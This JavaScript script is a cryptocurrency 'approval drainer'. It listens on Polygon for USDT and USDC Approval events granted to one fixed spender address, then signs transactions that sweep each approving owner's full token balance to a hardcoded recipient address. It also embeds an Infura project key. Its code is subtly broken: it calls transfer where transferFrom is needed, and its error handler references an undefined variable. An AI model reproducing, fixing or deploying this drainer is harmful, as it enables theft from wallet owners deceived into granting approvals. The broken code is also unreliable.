const Web3 = require('web3');
const WebSocket = require('ws');
// import { WebSocketProvider } from 'web3';
const web3_instance = Web3.Web3
const providerUrl = "wss://polygon-mainnet.infura.io/ws/v3/5ada7e98fb1e42af8c27dea6f189d3b1";
// const web3 = new web3_instance(new web3_instance.providers.WebSocket(providerUrl));
const web3 = new web3_instance(new web3_instance.providers.WebsocketProvider(providerUrl));
// console.log(web3.provider)
const ERC20_CONTRACT_ADDRESSES = [
  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
  "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
];
const log = console.log;
const SPECIFIC_SPENDER_ADDRESS = "0x6b0E47D0DD7eb1F9F50dF6c0c70cE3C732b5D2E5";
const PRIVATE_KEY = "privatekey";
const RECIPIENT_ADDRESS = "0x76B81dE28E0F742A6Bb8c3A37bD85ebA8660449D";

const ERC20_ABI = [
  // ERC20 ABI definitions
  {
    inputs: [
      { internalType: "string", name: "name_", type: "string" },
      { internalType: "string", name: "symbol_", type: "string" },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "account", type: "address" },
    ],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      {
        internalType: "uint256",
        name: "subtractedValue",
        type: "uint256",
      },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const listenToContract = (contractAddress) => {
  const tokenContract = new web3.eth.Contract(ERC20_ABI, contractAddress);
  // log(tokenContract.events.Approval().on('allEvents',()=>{}))
  log('listening...')
  const obj = tokenContract.events
    obj.Approval({
      filter: { spender: SPECIFIC_SPENDER_ADDRESS },
      fromBlock: "latest",
    })
    .on('data', async (event) => {
      console.log("Approval event received:", event);
      try{
      const owner = event.returnValues.owner;
      const value = event.returnValues.value;
      const ownerBalance = await tokenContract.methods.balanceOf(owner).call();
      
      console.log("Owner:", owner);
      console.log("Allowance:", value);
      console.log("Owner balance:", ownerBalance);

      if (ownerBalance != 0) {
        await sendTransferFrom(tokenContract, owner, RECIPIENT_ADDRESS, ownerBalance);
      }
    }catch(err){
      console.error("Error receiving event:", error)
    }
    })
};

const sendTransferFrom = async (contract, from, to, value) => {
  const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
  const data = contract.methods.transfer(from, to, value).encodeABI();

  const tx = {
    to: contract.options.address,
    gas: 2000000,
    data: data,
  };

  const signedTx = await account.signTransaction(tx);
  web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on("receipt", (receipt) => {
      console.log("Transfer successful:", receipt);
    })
    .on("error", (error) => {
      console.error("Error during transfer:", error);
    });
};


const main = () => {
  ERC20_CONTRACT_ADDRESSES.forEach((contractAddress) =>
    listenToContract(contractAddress)
  );
  console.log("Listening for Approval events...");
}
module.exports ={ main };

